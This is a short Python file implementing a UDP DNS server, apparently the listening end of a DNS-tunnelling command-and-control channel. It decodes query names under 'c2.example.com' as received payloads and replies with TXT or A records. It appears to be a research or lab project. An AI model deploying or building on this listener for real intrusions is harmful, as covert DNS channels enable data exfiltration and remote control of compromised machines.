import socket
from DNS_Research import decode
import struct

APEX_DOMAIN = "c2.example.com"
port = 8080

def build_response(data: bytes, question_end, response_type="TXT", MSG="Hello World!"):
    # Header (12 Bytes)
    trans_id = data[:2]
    flags = b'\x81\x80'
    qdcount = data[4:6]
    ancount = b'\x00\x01'
    nscount = b'\x00\x00'
    arcount = b'\x00\x00'
    
    header = trans_id + flags + qdcount + ancount + nscount + arcount
    
    question = data[12:question_end + 4] # Question section (QNAME + QTYPE + QCLASS)
    
    if response_type != "TXT":
        answer = (
            b'\xc0\x0c' # Pointer to the domain name in the question section
            b'\x00\x01' # Type A
            b'\x00\x01' # Class IN
            b'\x00\x00\x00\x3c' # TTL (60 seconds   
            b'\x00\x04' # RDLENGTH (4 bytes for IPv4 address)
            + socket.inet_aton("127.0.0.1") # RDATA (IPv4 address)
            )
        return header + question + answer
    
    else:
        answer_txt = (  
            b'\xc0\x0c' # Pointer to the domain name in the question section
            b'\x00\x10' # Type TXT
            b'\x00\x01' # Class In
            b'\x00\x00\x00\x3c' # TTL (60 seconds)        
        )
        
        msg_bytes = MSG.encode("ascii") if isinstance(MSG, str) else MSG
        
        txt_rdata = bytes([len(msg_bytes)]) + msg_bytes
        
        rdlength = struct.pack("!H", len(txt_rdata))
        
        return header + question + answer_txt + rdlength + txt_rdata
  
    
def parse_qname(data: bytes, offset: int):                                                
        labels = []                                                                           
        while data[offset] != 0:                                                              
            length = data[offset]                                                             
            offset += 1                                                                       
            labels.append(data[offset:offset + length].decode('ascii'))                       
            offset += length                                                               
        offset += 1                                                                           
        return '.'.join(labels), offset

def start_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))
    print(f"[+] Escutando em 0.0.0.0:{port}")
    
    while True:
        data, addr = sock.recvfrom(512)
        qname, question_end = parse_qname(data, 12)
        if qname.endswith(APEX_DOMAIN):
            payload = decode([qname], APEX_DOMAIN)
            print(f"[+] Payload recebido: {payload}")
            response = build_response(data, question_end)
            sock.sendto(response, addr)
            print(f"[+] Reposta enviada para {addr[0]}:{addr[1]}")
            
if __name__ == "__main__":
    start_server()